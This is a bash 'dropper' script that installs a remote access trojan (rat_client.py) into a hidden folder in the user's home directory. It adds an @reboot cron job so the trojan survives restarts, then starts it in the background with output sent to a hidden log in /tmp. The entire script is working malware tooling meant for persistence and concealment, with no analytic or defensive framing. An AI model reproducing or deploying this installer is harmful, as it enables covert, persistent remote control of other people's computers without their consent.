#!/bin/bash
echo "[DBLL-Dropper] Running installation..."

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INSTALL_DIR="$HOME/.local/.hidden"

mkdir -p "$INSTALL_DIR"
echo "[*] Installing to: $INSTALL_DIR"

# Copy RAT
if [ -f "$SCRIPT_DIR/rat_client.py" ]; then
    cp "$SCRIPT_DIR/rat_client.py" "$INSTALL_DIR/"
    chmod +x "$INSTALL_DIR/rat_client.py"
    echo "[✓] RAT installed"
else
    echo "[!] ERROR: rat_client.py not found!"
    exit 1
fi

# Persistence
CRON_JOB="@reboot python3 $INSTALL_DIR/rat_client.py &"

if ! crontab -l 2>/dev/null | grep -qF "$INSTALL_DIR/rat_client.py"; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    echo "[✓] Persistence set"
fi

# Start RAT
echo "[*] Starting RAT..."
nohup python3 "$INSTALL_DIR/rat_client.py" > /tmp/.rat.log 2>&1 &
echo "[✓] RAT running (PID: $!)"